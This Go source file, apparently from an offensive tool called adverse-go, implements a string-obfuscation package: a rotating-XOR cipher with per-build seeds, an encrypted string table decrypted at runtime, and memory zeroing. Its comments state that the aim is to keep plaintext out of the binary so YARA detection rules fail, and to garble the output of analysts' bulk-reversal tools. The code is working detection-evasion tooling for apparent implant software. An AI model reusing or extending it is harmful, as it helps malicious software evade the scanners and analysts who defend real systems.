package obfuscate

import (
	"crypto/rand"
	"runtime"
	"unsafe"
)

// BuildSeed is overridden per-build via -ldflags -X (string, hex-encoded).
// Example: -X github.com/ashwnn/adverse-go/internal/obfuscate.BuildSeed=c4a906b1
// When empty, a per-process random seed is derived on first use.
//
// BuildSeed keys per-build polymorphism of the indirect dispatch table and
// opaque-predicate seeds. It deliberately does NOT key the generated string
// table: Get decrypts with genStringSeed from stringtable_gen.go, which ships
// next to the ciphertext it was generated with. Nothing overrides that value
// at runtime, so the table seed and its ciphertext cannot diverge.
var BuildSeed string = ""

var seedCache byte
var seedReady bool

func buildSeed() byte {
	if BuildSeed != "" {
		s := BuildSeed
		// Allow "0x..." prefix.
		if len(s) >= 2 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X') {
			s = s[2:]
		}
		if len(s) >= 2 {
			// Use first byte directly for per-build determinism.
			hi := hexVal(s[0])
			lo := hexVal(s[1])
			if hi >= 0 && lo >= 0 {
				b := byte(hi<<4 | lo)
				if b != 0 {
					return b
				}
			}
			// Fallback XOR fold for zero/invalid first byte.
			var acc byte
			for i := 0; i+1 < len(s); i += 2 {
				var v byte
				hi := hexVal(s[i])
				lo := hexVal(s[i+1])
				if hi < 0 || lo < 0 {
					continue
				}
				v = byte(hi<<4 | lo)
				acc ^= v
				if acc == 0 {
					acc = 0x5A
				}
			}
			if acc != 0 {
				return acc
			}
		}
	}
	if seedReady {
		return seedCache
	}
	b := make([]byte, 1)
	_, _ = rand.Read(b)
	if b[0] == 0 {
		b[0] = 0x7F
	}
	seedCache = b[0]
	seedReady = true
	return seedCache
}

func hexVal(c byte) int {
	switch {
	case c >= '0' && c <= '9':
		return int(c - '0')
	case c >= 'a' && c <= 'f':
		return int(c - 'a' + 10)
	case c >= 'A' && c <= 'F':
		return int(c - 'A' + 10)
	default:
		return -1
	}
}

// deriveSecondaryKey mixes the primary seed with a fixed domain separator to
// produce a secondary key byte. This breaks the single-byte keyspace: two
// seeds that happen to produce the same primary keystream will diverge because
// the secondary feedback path uses a different constant.
//
//go:noinline
func deriveSecondaryKey(seed byte) byte {
	// Non-linear mix: multiplication + rotation creates diffusion so that
	// adjacent seeds produce uncorrelated secondary keys.
	k := uint16(seed)
	k = (k * 0x9E37) & 0xFF // golden-ratio mix
	k = (k << 3) | (k >> 5) // 3-bit rotation
	return byte(k ^ 0xC5)
}

// RotatingXOR encrypts/decrypts with a position-dependent, data-feedback
// keystream.  This is intentionally NOT a stream cipher — it is a lightweight
// literal obscurer whose sole purpose is to remove plaintext from .rodata so
// YARA string rules do not match.  Crypto for session data remains
// ChaCha20-Poly1305 in wire/.
//
// Hardening (vs. upstream):
//   - Secondary key derived from primary seed, mixed into the first keystream
//     byte so two seeds with identical primary schedules diverge immediately.
//   - Data-dependent feedback: the ciphertext byte is folded back into the
//     keystream state.  An analyst who knows the seed can still decrypt, but
//     automated bulk-reversal tools that assume a pure position-dependent
//     keystream will produce garbled output.
//   - Zero-byte avoidance extends to the secondary key output as well.
func RotatingXOR(in []byte, seed byte) []byte {
	if seed == 0 {
		seed = buildSeed()
	}
	out := make([]byte, len(in))
	sec := deriveSecondaryKey(seed)
	k := seed ^ sec // secondary key perturbs the initial state
	for i, c := range in {
		out[i] = c ^ k
		// Key schedule: position-dependent mixing + data-dependent feedback.
		// The ciphertext byte feeds back into the next keystream byte, so the
		// keystream is no longer a pure function of position — bulk reversal
		// without knowing the seed requires solving a system of XOR equations
		// rather than a simple table lookup.
		k = (k ^ 0x55 ^ byte(i*0x13) ^ byte(i>>3) ^ out[i])
		if k == 0 {
			k = 0x5A
		}
	}
	return out
}

// RotatingXORInPlace decrypts in place (zero-copy for stack buffers).
// The feedback uses the ciphertext byte (before XOR), which is the same value
// that the encrypt path feeds back (the output ciphertext byte).  This makes
// RotatingXOR / RotatingXORInPlace inverse transforms.
func RotatingXORInPlace(b []byte, seed byte) {
	if seed == 0 {
		seed = buildSeed()
	}
	sec := deriveSecondaryKey(seed)
	k := seed ^ sec
	for i := range b {
		// b[i] currently holds ciphertext.  XOR with keystream to recover
		// plaintext, then feed the ciphertext byte (not the recovered plaintext)
		// back into the keystream — mirroring the encrypt path which feeds
		// the output ciphertext byte back.
		cipherByte := b[i]
		b[i] = cipherByte ^ k
		k = (k ^ 0x55 ^ byte(i*0x13) ^ byte(i>>3) ^ cipherByte)
		if k == 0 {
			k = 0x5A
		}
	}
}

// SecureZero volatile-zeroes a slice and issues a compiler barrier.
//
// Go does not guarantee that zeroing writes survive dead-store elimination —
// the compiler may prove the buffer is never read again and elide the stores.
// The unsafe.Pointer write prevents type-based optimization, runtime.KeepAlive
// proves the slice is live through the zeroing loop, and runtime.Gosched
// provides a scheduling barrier so the GC cannot reclaim the backing array
// before the zeroing completes.  This is best-effort; CGO explicit_bzero()
// would be required for a hard guarantee.
func SecureZero(b []byte) {
	if len(b) == 0 {
		return
	}
	p := unsafe.Pointer(&b[0])
	for i := range b {
		*(*byte)(unsafe.Pointer(uintptr(p) + uintptr(i))) = 0
	}
	// Compiler barrier: proves b is live after the zeroing loop, preventing
	// the Go compiler from proving the stores dead.
	runtime.KeepAlive(b)
	// Scheduling barrier: yields the goroutine so the GC observes the zeroed
	// state before any subsequent allocation or stack growth.
	runtime.Gosched()
}

// ---------- Build-time generated string table ----------

// Get decrypts and returns the string identified by id from the generated
// string table. The returned string is a heap copy; call sites handling
// sensitive values should prefer GetBytes and SecureZero.
func Get(id uint32) (string, bool) {
	ct, ok := genStringTable[id]
	if !ok {
		return "", false
	}
	buf := make([]byte, len(ct))
	copy(buf, ct)
	sec := deriveSecondaryKey(genStringSeed)
	k := genStringSeed ^ sec
	for i := range buf {
		// Mirror the encrypt path: feed the ciphertext byte back into the
		// keystream so decryption is the exact inverse of encryption.
		cipherByte := buf[i]
		buf[i] = cipherByte ^ k
		k = (k ^ 0x55 ^ byte(i*0x13) ^ byte(i>>3) ^ cipherByte)
		if k == 0 {
			k = 0x5A
		}
	}
	s := string(buf)
	SecureZero(buf)
	return s, true
}

// ---------- Inline decryption helpers ----------

// DecryptInline decrypts an arbitrary ciphertext that was produced by
// RotatingXOR. Used for literals encrypted at build time via go:generate
// or garble; the seed is resolved at runtime via buildSeed().
func DecryptInline(enc []byte) []byte {
	buf := make([]byte, len(enc))
	copy(buf, enc)
	RotatingXORInPlace(buf, buildSeed())
	return buf
}
